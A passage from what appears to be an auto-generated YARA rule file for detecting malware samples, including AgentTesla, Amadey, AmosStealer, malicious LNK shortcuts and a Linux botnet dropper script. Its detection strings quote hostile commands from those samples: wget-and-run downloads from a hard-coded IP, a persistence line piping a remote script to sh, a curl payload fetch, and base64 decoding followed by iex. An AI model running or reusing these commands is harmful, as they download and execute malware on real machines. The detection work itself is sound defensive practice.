      $s2 = "{3c8aee25-c939-48d3-ac1f-d30da429195b}, PublicKeyToken=3e56350693f7355e" fullword wide /* score: '13.00'*/
      $s3 = "Selected compression algorithm is not supported." fullword wide /* score: '10.00'*/
      $s4 = "Unknown Header" fullword wide /* score: '9.00'*/
      $s5 = "SmartAssembly.Attributes" fullword ascii /* PEStudio Blacklist: strings */ /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule sig_8a99adbc06da5dff32ade6cacf368c4f9b8605e54ceb3321e1171fa302d532ef_8a99adbc {
   meta:
      description = "_subset_batch - file 8a99adbc06da5dff32ade6cacf368c4f9b8605e54ceb3321e1171fa302d532ef_8a99adbc.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "8a99adbc06da5dff32ade6cacf368c4f9b8605e54ceb3321e1171fa302d532ef"
   strings:
      $x1 = "<!DOCTYPE html><html lang=en-US><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content=\"IE=edge\"><title>Universal<" ascii /* score: '31.00'*/
      $s2 = "rent and future movies\"><meta name=twitter:image content=/static/favicon.png></head><body><noscript><strong>Please enable JavaS" ascii /* score: '23.00'*/
      $s3 = "<!DOCTYPE html><html lang=en-US><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content=\"IE=edge\"><title>Universal<" ascii /* score: '20.00'*/
      $s4 = "=Universal><meta name=description content=\"Universal Pictures | New Movies In Theaters & Upcoming Releases Official website of " ascii /* score: '18.00'*/
      $s5 = "roperty=og:site_name content=Universal><meta property=og:title content=Universal><meta property=og:description content=\"Univers" ascii /* score: '15.00'*/
      $s6 = "niversal Pictures. Watch trailers and get details for current and future movies!\"><meta property=og:type content=website><meta " ascii /* score: '14.00'*/
      $s7 = "l Pictures | New Movies In Theaters & Upcoming Releases Official website of Universal Pictures. Watch trailers and get details f" ascii /* score: '12.00'*/
      $s8 = "or current and future movies\"><meta property=og:url content=/ ><meta property=og:image content=/static/favicon.png><meta proper" ascii /* score: '12.00'*/
      $s9 = "ures | New Movies In Theaters & Upcoming Releases Official website of Universal Pictures. Watch trailers and get details for cur" ascii /* score: '12.00'*/
      $s10 = "itle><meta name=viewport content=\"width=device-width,user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1,viewport-" ascii /* score: '11.00'*/
      $s11 = "e=twitter:card content=summary><meta name=twitter:title content=Universal><meta name=twitter:description content=\"Universal Pic" ascii /* score: '11.00'*/
      $s12 = "ript to continue.</strong></noscript><div id=app></div><script src=/static/js/chunk-vendors.521cba19.js></script><script src=/st" ascii /* score: '10.00'*/
      $s13 = "atic/js/index.d9d75c6f.js></script></body></html>" fullword ascii /* score: '10.00'*/
      $s14 = "y=og:image:width content=500><meta property=og:image:height content=500><meta property=og:image:type content=image/png><meta nam" ascii /* score: '9.00'*/
      $s15 = "it=cover\"><link rel=stylesheet href=/static/index.883130ca.css><link rel=icon href=./static/favicon.png><meta name=title conten" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 5KB and
      1 of ($x*) and 4 of them
}

rule AgentTesla_signature__3 {
   meta:
      description = "_subset_batch - file AgentTesla(signature).hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "e97449c39c3afc3a72cc001ce1897f98f59f3c630d24ba6d666903a664e37999"
   strings:
      $x1 = "<!DOCTYPE html><html lang=en-US><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content=\"IE=edge\"><title>ArtPlacer<" ascii /* score: '31.00'*/
      $s2 = "<!DOCTYPE html><html lang=en-US><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content=\"IE=edge\"><title>ArtPlacer<" ascii /* score: '20.00'*/
      $s3 = "AAAAAABAAEAAA" ascii /* base64 encoded string '     @ @ ' */ /* score: '16.50'*/
      $s4 = "m Mockups, 3D Virtual Exhibitions, and with Website Plugins to boost your art sales.\"></head><body><noscript><strong>Please ena" ascii /* score: '15.00'*/
      $s5 = "ite><meta property=og:site_name content=ArtPlacer><meta property=og:title content=ArtPlacer><meta property=og:description conten" ascii /* score: '15.00'*/
      $s6 = "itle><meta name=viewport content=\"width=device-width,user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1,viewport-" ascii /* score: '11.00'*/
      $s7 = "=title content=ArtPlacer><meta name=description content=\"ArtPlacer | The ultimate Art Marketing Tool Showcase your art in exqui" ascii /* score: '11.00'*/
      $s8 = "ArtPlacer><meta name=twitter:description content=\"ArtPlacer | The ultimate Art Marketing Tool Showcase your art in exquisite Ro" ascii /* score: '11.00'*/
      $s9 = "le JavaScript to continue.</strong></noscript><div id=app></div><script src=/static/js/chunk-vendors.dd3841d5.js></script><scrip" ascii /* score: '10.00'*/
      $s10 = "t src=/static/js/index.231de411.js></script></body></html>" fullword ascii /* score: '10.00'*/
      $s11 = "ite Room Mockups, 3D Virtual Exhibitions, and with Website Plugins to boost your art sales.\"><meta property=og:type content=web" ascii /* score: '9.00'*/
      $s12 = "site Plugins to boost your art sales.\"><meta property=og:url content=/ ><meta property=og:image content=data:image/gif;base64,R" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 4KB and
      1 of ($x*) and 4 of them
}

rule sig_8af83cc279c2e64a067b0abb73f78c358607ae2056357d7917ec92d3aaf032f8_8af83cc2 {
   meta:
      description = "_subset_batch - file 8af83cc279c2e64a067b0abb73f78c358607ae2056357d7917ec92d3aaf032f8_8af83cc2.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "8af83cc279c2e64a067b0abb73f78c358607ae2056357d7917ec92d3aaf032f8"
   strings:
      $s1 = "eeeeeeed" ascii /* reversed goodware string 'deeeeeee' */ /* score: '18.00'*/
      $s2 = "VVVVVVVM" fullword ascii /* reversed goodware string 'MVVVVVVV' */ /* score: '16.50'*/
      $s3 = "VVVVVVVYU" fullword ascii /* base64 encoded string 'UUUUUX' */ /* score: '16.50'*/
      $s4 = "eVVVVVVVTC" fullword ascii /* base64 encoded string 'yUUUUUL' */ /* score: '14.00'*/
      $s5 = "6VVVVVVVVVVVVVVVV" fullword ascii /* base64 encoded string 'UUUUUUUUUUUU' */ /* score: '14.00'*/
      $s6 = "fWWWWW" fullword ascii /* reversed goodware string 'WWWWWf' */ /* score: '11.00'*/
      $s7 = "qtQL:\"" fullword ascii /* score: '10.00'*/
      $s8 = "3`3`3`3`3`3" fullword ascii /* score: '9.00'*/ /* hex encoded string '333' */
      $s9 = "* tb-!z;%" fullword ascii /* score: '9.00'*/
      $s10 = "YYYYYY3" fullword ascii /* score: '8.00'*/
      $s11 = "VVVD++ " fullword ascii /* score: '8.00'*/
      $s12 = "VVVA4++++ 1" fullword ascii /* score: '8.00'*/
      $s13 = "YYeVVVV@++ ;" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 2000KB and
      8 of them
}

rule sig_8b0a7e3509eff17e78ef8a46fa919c44cbdf1a487df47886033b2455b6f7a677_8b0a7e35 {
   meta:
      description = "_subset_batch - file 8b0a7e3509eff17e78ef8a46fa919c44cbdf1a487df47886033b2455b6f7a677_8b0a7e35.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "8b0a7e3509eff17e78ef8a46fa919c44cbdf1a487df47886033b2455b6f7a677"
   strings:
      $s1 = "$decoded = [System.Text.Encoding]::Unicode.GetString($bytes)" fullword ascii /* score: '26.00'*/
      $s2 = "iex $decoded                                                                                        " fullword ascii /* score: '17.00'*/
      $s3 = "$bytes = [System.Convert]::FromBase64String($combined)" fullword ascii /* score: '14.00'*/
      $s4 = "wBuAG4AZQBjAHQAaQBvAG4AIABlAHMAdABhAGIAbABpAHMAaABlAGQAIABvAG4AIAAkAHsASQBOAEkAVABfAEkAUAB9ADoAJAB7AEkATgBJAFQAXwBQAE8AUgBUAH0AI" ascii /* score: '11.00'*/
      $s5 = "QBnAF8AaQBwADIAKwAkAG0AaQBnAF8AaQBwADMAKwAkAG0AaQBnAF8AaQBwADQAKwAkAG0AaQBnAF8AaQBwADUAKwAkAG0AaQBnAF8AaQBwADYAKwAkAG0AaQBnAF8Aa" ascii /* score: '11.00'*/
      $s6 = "wBPAGIAagAgAD0AIAAkAG4AMQArACQAbgAyACsAJABuADMAKwAkAG4ANAArACQAbgA1ACsAJABuADYAKwAkAG4ANwArACQAbgA4ACsAJABuADkAKwAkAG4AMQAwAAoAC" ascii /* score: '11.00'*/
      $s7 = "ABgACIAJABQAGEAeQBsAG8AYQBkAFAAYQB0AGgAYAAiACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAC" ascii /* score: '11.00'*/
      $s8 = "AB0ADEAOQArACQAdAAyADAAKwAkAHQAMgAxACsAJAB0ADIAMgArACQAdAAyADMAKwAkAHQAMgA0ACsAJAB0ADIANQArACQAdAAyADYAKwAkAHQAMgA3ACsAJAB0ADIAO" ascii /* score: '11.00'*/
      $s9 = "QBpAHQAVABpAG0AZQAKAH0ACgAKAGkAZgAgACgAWwBTAHkAcwB0AGUAbQAuAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBQAHIAbwBjAGUAcwBzAG8AcgBDAG8Ad" ascii /* score: '11.00'*/
      $s10 = "wBtAGUAQgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQA7AAoAYAAkAHMAdAByAGUAYQBtAC4AJABGAGwAdQBzAGgATQBlAHQAaAAoACkAOwAKAAoAdwBoAGkAbABlACgAY" ascii /* score: '11.00'*/
      $s11 = "AcAB0ACAAcAB" ascii /* base64 encoded string 'p t   p ' */ /* score: '10.00'*/
   condition:
      uint16(0) == 0x6324 and filesize < 100KB and
      8 of them
}

rule sig_8b7c6ffb25af402d20e5b4fdec3cb91d9ecba735ab98f5ad2785aa257101bcc1_8b7c6ffb {
   meta:
      description = "_subset_batch - file 8b7c6ffb25af402d20e5b4fdec3cb91d9ecba735ab98f5ad2785aa257101bcc1_8b7c6ffb.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "8b7c6ffb25af402d20e5b4fdec3cb91d9ecba735ab98f5ad2785aa257101bcc1"
   strings:
      $s1 = "-!- -\\\\xP" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 900KB and
      all of them
}

rule sig_8bbafbe1f7b5ee8f390ca5ce1e260b2b80af4209e833e9beae22239731a1546c_8bbafbe1 {
   meta:
      description = "_subset_batch - file 8bbafbe1f7b5ee8f390ca5ce1e260b2b80af4209e833e9beae22239731a1546c_8bbafbe1.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "8bbafbe1f7b5ee8f390ca5ce1e260b2b80af4209e833e9beae22239731a1546c"
   strings:
      $s1 = "bbbbbbbbc" ascii /* reversed goodware string 'cbbbbbbbb' */ /* score: '18.00'*/
      $s2 = "mSIEeUbM" fullword ascii /* score: '9.00'*/
      $s3 = "r-%d%l" fullword ascii /* score: '8.00'*/
      $s4 = "bbbbbbbbbbbbc" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 6000KB and
      all of them
}

rule a2458235ed8647d1c43b3575e3396bb3f4183e67130a7145177b758e63aac419_a2458235 {
   meta:
      description = "_subset_batch - file a2458235ed8647d1c43b3575e3396bb3f4183e67130a7145177b758e63aac419_a2458235.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "a2458235ed8647d1c43b3575e3396bb3f4183e67130a7145177b758e63aac419"
   strings:
      $s1 = "XetBV -3U" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 600KB and
      all of them
}

rule a9b09e4153f5f4ea052211fe7ba692913baf6439472f35fae53ac979193b2702_a9b09e41 {
   meta:
      description = "_subset_batch - file a9b09e4153f5f4ea052211fe7ba692913baf6439472f35fae53ac979193b2702_a9b09e41.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "a9b09e4153f5f4ea052211fe7ba692913baf6439472f35fae53ac979193b2702"
   strings:
      $s1 = "#* -X" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 900KB and
      all of them
}

rule sig_92f294b4cbba83a32875b68b010370c81695df061d99812ccb8db5e21a83f8c4_92f294b4 {
   meta:
      description = "_subset_batch - file 92f294b4cbba83a32875b68b010370c81695df061d99812ccb8db5e21a83f8c4_92f294b4.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "92f294b4cbba83a32875b68b010370c81695df061d99812ccb8db5e21a83f8c4"
   strings:
      $x1 = "n versus intense historic nice essay abandono final law aparente sin anywhere cycle judgment apetito table prevent deficit sign " ascii /* score: '43.00'*/
      $x2 = "s chest million lot net mental fade shape participant bottom pretend wrong young retirement instructor oppose honey field with c" ascii /* score: '41.00'*/
      $s3 = "lisis transformation salary reader dependent engineer sheet page French possess discover custom dog membership clinic metal dare" ascii /* score: '29.00'*/
      $s4 = "n priest cross domestic operation surround throw setting length top alta charity rule entorno impress dark condition ascender ca" ascii /* score: '29.00'*/
      $s5 = "ar life bean correct undergo advanced blood dry campo protect cry person difficulty biological beginning garlic analyze beer you" ascii /* score: '29.00'*/
      $s6 = "n investment segment evening vehicle face nowhere pot small priority smell manufacturer dig eliminate plate widespread powerful " ascii /* score: '26.00'*/
      $s7 = "nsul dialogue restriction ceiling illness weight target practice representative estructura British column additional prevent mor" ascii /* score: '24.00'*/
      $s8 = "tico new many democracia bank implement genetic painful equipment another journal twin strip altitud read complaint dream absenc" ascii /* score: '21.00'*/
      $s9 = "n waste continue receive author apuro ready south emission muscle ourselves weak anniversary espera competitor shrug actitud ser" ascii /* score: '20.00'*/
      $s10 = "omato birthday score sport necessarily cookie just open principal mechanism apartment craft fighting telephone eight temperature" ascii /* score: '19.00'*/
      $s11 = "sfer surprised area enamorar operation bell account onion stir wheel director international host affair organic crack regime acc" ascii /* score: '19.00'*/
      $s12 = "nsul dialogue restriction ceiling illness weight target practice representative estructura British column additional prevent mor" ascii /* score: '19.00'*/
      $s13 = " deny pan target recruit eslora passage dish alliance break environment personality machine bring pursue direcci" fullword ascii /* score: '19.00'*/
      $s14 = "ation shit aid born contemporary immediate maintain argue entrar message beso heavy since minister business leaf chef shade conj" ascii /* score: '18.00'*/
      $s15 = "n agricultor audience meeting visit element bowl medication space proceed glove reinforce react double avoid up can base size ov" ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x683c and filesize < 70KB and
      1 of ($x*) and 4 of them
}

rule sig_8c85892cb48f43eded4ce023af6a8b8e284977d29552ec26be23009ff25b1d1f_8c85892c {
   meta:
      description = "_subset_batch - file 8c85892cb48f43eded4ce023af6a8b8e284977d29552ec26be23009ff25b1d1f_8c85892c.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "8c85892cb48f43eded4ce023af6a8b8e284977d29552ec26be23009ff25b1d1f"
   strings:
      $s1 = "bIDLl~_" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 16000KB and
      all of them
}

rule sig_92b089fd8b37056e03dac00b2779dc11b0f365e41284ebebd0b96fb440e5ad84_92b089fd {
   meta:
      description = "_subset_batch - file 92b089fd8b37056e03dac00b2779dc11b0f365e41284ebebd0b96fb440e5ad84_92b089fd.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "92b089fd8b37056e03dac00b2779dc11b0f365e41284ebebd0b96fb440e5ad84"
   strings:
      $s1 = "VCRUNTIME140_1.dll" fullword ascii /* score: '23.00'*/
      $s2 = "python310.dll" fullword ascii /* score: '23.00'*/
      $s3 = "liblldb.dll" fullword ascii /* score: '23.00'*/
      $s4 = "micorsercs86bitssercises.exe" fullword ascii /* score: '22.00'*/
      $s5 = "VCRUNTIME140.dllPK" fullword ascii /* score: '19.00'*/
      $s6 = "liblldb.dllPK" fullword ascii /* score: '16.00'*/
      $s7 = "python310.dllPK" fullword ascii /* score: '16.00'*/
      $s8 = "VCRUNTIME140_1.dllPK" fullword ascii /* score: '16.00'*/
      $s9 = "MSVCP140.dllPK" fullword ascii /* score: '16.00'*/
      $s10 = ")HT@cH" fullword ascii /* reversed goodware string 'Hc@TH)' */ /* score: '11.00'*/
      $s11 = "micorsercs86bitssercises.exePK" fullword ascii /* score: '11.00'*/
      $s12 = " 2/2'2;2=" fullword ascii /* score: '9.00'*/ /* hex encoded string '""' */
      $s13 = "_<7>(>$>4>," fullword ascii /* score: '9.00'*/ /* hex encoded string 't' */
      $s14 = "CSpySpG" fullword ascii /* score: '9.00'*/
      $s15 = "W[c -i " fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 13000KB and
      8 of them
}

rule sig_8c92e5166c435059201c246740fa6553b27abf54cdc4c725c3a7fd3e3c7ef004_8c92e516 {
   meta:
      description = "_subset_batch - file 8c92e5166c435059201c246740fa6553b27abf54cdc4c725c3a7fd3e3c7ef004_8c92e516.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "8c92e5166c435059201c246740fa6553b27abf54cdc4c725c3a7fd3e3c7ef004"
   strings:
      $s1 = "'M'M'M'M" fullword ascii /* reversed goodware string 'M'M'M'M'' */ /* score: '11.00'*/
      $s2 = "afeffefeeffe" ascii /* score: '8.00'*/
      $s3 = "feffefeeffe" ascii /* score: '8.00'*/
      $s4 = "afefeffeef" ascii /* score: '8.00'*/
      $s5 = "feffeefefef" ascii /* score: '8.00'*/
      $s6 = "affefeeffe" ascii /* score: '8.00'*/
      $s7 = "feffeeffefea" ascii /* score: '8.00'*/
      $s8 = "ffeefefeffe" ascii /* score: '8.00'*/
      $s9 = "afefeffeefhah" fullword ascii /* score: '8.00'*/
      $s10 = "fefefeffefe" ascii /* score: '8.00'*/
      $s11 = "fefefeffe" ascii /* score: '8.00'*/
      $s12 = "ffefeeffea" ascii /* score: '8.00'*/
      $s13 = "hfefeffeeffe" fullword ascii /* score: '8.00'*/
      $s14 = "afeffeefef" ascii /* score: '8.00'*/
      $s15 = "feffeefefa" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      8 of them
}

rule Amadey_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__f61471bf {
   meta:
      description = "_subset_batch - file Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f61471bf.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "f61471bf729deddf78cce549b739bb77509aa030ffbb161ba700f4c8fd943cbd"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "acr-GETWELL-100bnqxk.aqk_.exe" fullword wide /* score: '24.00'*/
      $s3 = "acr-GETWELL-100bnqxk.aqk_" fullword wide /* score: '9.00'*/
      $s4 = "feffefeeffe" ascii /* score: '8.00'*/
      $s5 = "affefeeffe" ascii /* score: '8.00'*/
      $s6 = "feffeefefa" ascii /* score: '8.00'*/
      $s7 = "ffefeeffe" ascii /* score: '8.00'*/
      $s8 = "fefeffefeef" ascii /* score: '8.00'*/
      $s9 = "affeeffefea" ascii /* score: '8.00'*/
      $s10 = "afefefeffe" ascii /* score: '8.00'*/
      $s11 = "feffefeefef" ascii /* score: '8.00'*/
      $s12 = "fefeffeef" ascii /* score: '8.00'*/
      $s13 = "feffefefe" ascii /* score: '8.00'*/
      $s14 = "ffeeffefea" ascii /* score: '8.00'*/
      $s15 = "fefefeffeefa" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule sig_90f413295d21b19967dada3e7a574877fb8ea14de4cf043b1add57e6d664d3a0_90f41329 {
   meta:
      description = "_subset_batch - file 90f413295d21b19967dada3e7a574877fb8ea14de4cf043b1add57e6d664d3a0_90f41329.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "90f413295d21b19967dada3e7a574877fb8ea14de4cf043b1add57e6d664d3a0"
   strings:
      $s1 = "\".DLLE" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 2000KB and
      all of them
}

rule sig_8dc080683c333def9c5bfa5d32779703c660d5d34e54963735a8419f0aff2c1d_8dc08068 {
   meta:
      description = "_subset_batch - file 8dc080683c333def9c5bfa5d32779703c660d5d34e54963735a8419f0aff2c1d_8dc08068.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "8dc080683c333def9c5bfa5d32779703c660d5d34e54963735a8419f0aff2c1d"
   strings:
      $x1 = "/WGTTT:FAIT /WLWUO:3LSRH6 /D/C \"for %T in (T) do for %C in (ip) do for %P in (JavAsCr) do  for %S in (MsH) do for %U in (TA) do" wide /* score: '46.00'*/
      $x2 = "C:\\Windows\\System32\\cmd.exe" fullword ascii /* score: '38.00'*/
      $s3 = "Michele Santos$..\\..\\..\\..\\Windows\\System32\\cmd.exe" fullword wide /* score: '27.00'*/
      $s4 = "C:\\Windows\\System32" fullword wide /* score: '18.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 8KB and
      1 of ($x*) and all of them
}

rule sig_947592b5dd891ad8cfd2b496186e260021a4a9782b6d4de9da032b706f597673_947592b5 {
   meta:
      description = "_subset_batch - file 947592b5dd891ad8cfd2b496186e260021a4a9782b6d4de9da032b706f597673_947592b5.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "947592b5dd891ad8cfd2b496186e260021a4a9782b6d4de9da032b706f597673"
   strings:
      $x1 = "/C echo QWNjb3JkaW5nIHRvIGFsbCBrbm93biBsYXdzCm9mIGF2aWF0aW9uLAoKdGhlcmUgaXMgbm8gd2F5IGEgYmVlCnNob3VsZCBiZSBhYmxlIHRvIGZseS4KCkl0" wide /* score: '51.00'*/
      $x2 = "C:\\Windows\\System32\\cmd.exe" fullword ascii /* score: '38.00'*/
      $s3 = ")cmd.exe" fullword wide /* score: '30.00'*/
      $s4 = "%ProgramFiles%\\Mozilla Firefox\\firefox.exe" fullword wide /* score: '24.00'*/
      $s5 = "Application Form.pdf$..\\..\\..\\..\\Windows\\System32\\cmd.exe" fullword wide /* score: '23.00'*/
      $s6 = "C:\\Windows\\system32" fullword wide /* score: '18.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 9KB and
      1 of ($x*) and all of them
}

rule a09335aa9ea1a030ac39f1f39ee0dc0a916b1feddb45a677d241b2cc8f70bf01_a09335aa {
   meta:
      description = "_subset_batch - file a09335aa9ea1a030ac39f1f39ee0dc0a916b1feddb45a677d241b2cc8f70bf01_a09335aa.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "a09335aa9ea1a030ac39f1f39ee0dc0a916b1feddb45a677d241b2cc8f70bf01"
   strings:
      $x1 = "cmd.exe /c start msedge \"https://info-ups.com/pdf/address-validation-guidelines.pdf\" && curl -sLo \"%TEMP%\\sw.ms\" \"https://" wide /* score: '75.00'*/
      $x2 = "C:\\Windows\\System32\\cmd.exe" fullword ascii /* score: '38.00'*/
      $s3 = "!..\\..\\..\\Windows\\System32\\cmd.exe" fullword wide /* score: '27.00'*/
      $s4 = "C:\\Windows\\System32" fullword wide /* score: '18.00'*/
      $s5 = "1System32" fullword wide /* score: '12.00'*/
      $s6 = "%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe" fullword wide /* score: '11.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 8KB and
      1 of ($x*) and all of them
}

rule sig_8e0b74f56fe4b61051029516e5146a9b73271b63bffd3288eccabc25396c529e_8e0b74f5 {
   meta:
      description = "_subset_batch - file 8e0b74f56fe4b61051029516e5146a9b73271b63bffd3288eccabc25396c529e_8e0b74f5.chm"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "8e0b74f56fe4b61051029516e5146a9b73271b63bffd3288eccabc25396c529e"
   strings:
      $s1 = "HHA Version 4.74.8702" fullword ascii /* PEStudio Blacklist: strings */ /* score: '12.00'*/
      $s2 = "<(::DataSpace/Storage/MSCompressed/Content" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5449 and filesize < 700KB and
      all of them
}

rule sig_8ee2b84a1f996b66512f0ea120d99ed529ceb79b7940851c2a301c5cd8f68852_8ee2b84a {
   meta:
      description = "_subset_batch - file 8ee2b84a1f996b66512f0ea120d99ed529ceb79b7940851c2a301c5cd8f68852_8ee2b84a.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "8ee2b84a1f996b66512f0ea120d99ed529ceb79b7940851c2a301c5cd8f68852"
   strings:
      $s1 = "O_guo+ -" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 2000KB and
      all of them
}

rule sig_8fb867969d38a6640506c3c290be52bf5550e11f3bdaab98861cdf0d362eea8f_8fb86796 {
   meta:
      description = "_subset_batch - file 8fb867969d38a6640506c3c290be52bf5550e11f3bdaab98861cdf0d362eea8f_8fb86796.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "8fb867969d38a6640506c3c290be52bf5550e11f3bdaab98861cdf0d362eea8f"
   strings:
      $s1 = "(wget http://194.31.222.17/v/armv4l -O- || busybox wget http://194.31.222.17/v/armv4l -O-) > .f; chmod 777 .f; ./.f circlehole" fullword ascii /* score: '28.00'*/
      $s2 = "(wget http://194.31.222.17/v/armv5l -O- || busybox wget http://194.31.222.17/v/armv5l -O-) > .f; chmod 777 .f; ./.f circlehole" fullword ascii /* score: '28.00'*/
      $s3 = "(wget http://194.31.222.17/v/armv7l -O- || busybox wget http://194.31.222.17/v/armv7l -O-) > .f; chmod 777 .f; ./.f circlehole" fullword ascii /* score: '28.00'*/
      $s4 = "grep -q 'sleep 120' /mnt/mtd/dep2.sh || sed -i '/route add/a sleep 120; wget http://s.cuckstudios.su/k -O-|sh' /mnt/mtd/dep2.sh" fullword ascii /* score: '20.00'*/
      $s5 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii /* score: '14.00'*/
      $s6 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii /* score: '14.00'*/
      $s7 = "(cp /proc/self/exe .f || busybox cp /bin/busybox .f); > .f; (chmod 777 .f || busybox chmod 777 .f);" fullword ascii /* score: '11.00'*/
      $s8 = ">/tmp/.a && cd /tmp" fullword ascii /* score: '11.00'*/
      $s9 = ">/var/tmp/.a && cd /var/tmp" fullword ascii /* score: '11.00'*/
      $s10 = ">/home/.a && cd /home" fullword ascii /* score: '11.00'*/
      $s11 = ">/var/.a && cd /var" fullword ascii /* score: '8.00'*/
      $s12 = ">/dev/shm/.a && cd /dev/shm" fullword ascii /* score: '8.00'*/
      $s13 = "# gosh that one retard from australia SURE ate his bird" fullword ascii /* score: '8.00'*/
      $s14 = ">/dev/.a && cd /dev" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2023 and filesize < 2KB and
      8 of them
}

rule sig_92e60c408f718faa845d14e982ca0fa76b448d58787d687cb8d125f75d477fba_92e60c40 {
   meta:
      description = "_subset_batch - file 92e60c408f718faa845d14e982ca0fa76b448d58787d687cb8d125f75d477fba_92e60c40.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "92e60c408f718faa845d14e982ca0fa76b448d58787d687cb8d125f75d477fba"
   strings:
      $s1 = "    powershell -windowstyle hidden -command \"Start-Process '%~f0' -ArgumentList 'h' -WindowStyle Hidden\"" fullword ascii /* score: '28.00'*/
      $s2 = "cd /d \"%target%\"" fullword ascii /* score: '26.00'*/
      $s3 = "python.exe sh.py -i vot.bin -k x.txt" fullword ascii /* score: '25.00'*/
      $s4 = "set \"target=%USERPROFILE%\\Contacts\\rop\"" fullword ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 1KB and
      all of them
}

rule sig_932e8f10ac498d93bd991737a6a17bce0acfc02d9d7059c04cbf083e57955c5b_932e8f10 {
   meta:
      description = "_subset_batch - file 932e8f10ac498d93bd991737a6a17bce0acfc02d9d7059c04cbf083e57955c5b_932e8f10.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "932e8f10ac498d93bd991737a6a17bce0acfc02d9d7059c04cbf083e57955c5b"
   strings:
      $s1 = "#coded/Pethk" fullword ascii /* score: '9.00'*/
      $s2 = "/ftpdgdm[" fullword ascii /* score: '9.00'*/
      $s3 = "GZi#%s%" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule AmosStealer_signature__72353ded {
   meta:
      description = "_subset_batch - file AmosStealer(signature)_72353ded.macho"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "72353deda295eecab5c990d2d297985953cdb700ff02e8d2ba2d524bac358abd"
   strings:
      $s1 = "1logic_error" fullword ascii /* score: '12.00'*/
      $s2 = "__ZNSt11logic_errorC2EPKc" fullword ascii /* score: '12.00'*/
      $s3 = "__ZTISt11logic_error" fullword ascii /* score: '12.00'*/
